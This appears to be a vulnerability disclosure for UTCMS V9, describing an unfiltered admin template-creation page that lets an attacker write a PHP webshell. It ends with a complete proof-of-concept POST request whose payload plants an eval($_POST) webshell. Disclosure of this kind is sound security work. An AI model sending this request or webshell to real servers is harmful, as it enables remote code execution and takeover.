# Vendor

HuangDou

# Product

UTCMS

# version

 V9

# Download 

https://gitee.com/usualtool/ut-cms

# Vulnerability

Arbitrary file creation

# Description

In the background page of UTCMS, page templates can be created, but the page does not filter the name and content of the template, allowing attackers to directly create a Webshell with the php suffix.

# Analysis

1. The app/modules/ut-template/admin/template_creat.php page can be used to create templates, but there are no filtering rules for the created content and the name of the template file.
<img width="1521" alt="image" src="https://github.com/user-attachments/assets/aa7c229f-478b-4c4f-856a-ab1d9a2d3e06">

2. The name of the Webshell is passed in the "page" parameter, and the content of the Webshell is passed in the "content" parameter.
<img width="1447" alt="image" src="https://github.com/user-attachments/assets/80a09fa5-979f-4450-aefc-e656a262929d">

3. The created files have no routing restrictions and can be accessed directly.
<img width="727" alt="image" src="https://github.com/user-attachments/assets/c98ccf8a-9131-43f2-9ecf-9e5713f9af25">
<img width="655" alt="image" src="https://github.com/user-attachments/assets/ca72c2ad-9d53-465b-a20d-babd752023d6">


# POC
```
POST /app/dev/?m=ut-template&p=template_creat&do=save HTTP/1.1
Host: 192.168.17.24
Content-Length: 95
Cache-Control: max-age=0
Origin: http://192.168.17.24
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.17.24/app/dev/?m=ut-template&p=template_creat.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Nav=ut-frame; Lock=0; LCMSCID=eNoBMADP_0xi_M4DSIoRPJX0GmjWp8P0dR_nRDrVaQtwMd_VebHzo4R6BzTlLJOsxv0ZZWuUZkyuGGA; Hm_lvt_e3403438a2b250ca086ee44c2c5ebf72=1723189774; Language=zh; PHPSESSID=q482tkj0h2mqko9m7bumq149g5
Connection: close

module=ut-frame&skin=front&page=mirage.php&content=%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E
```
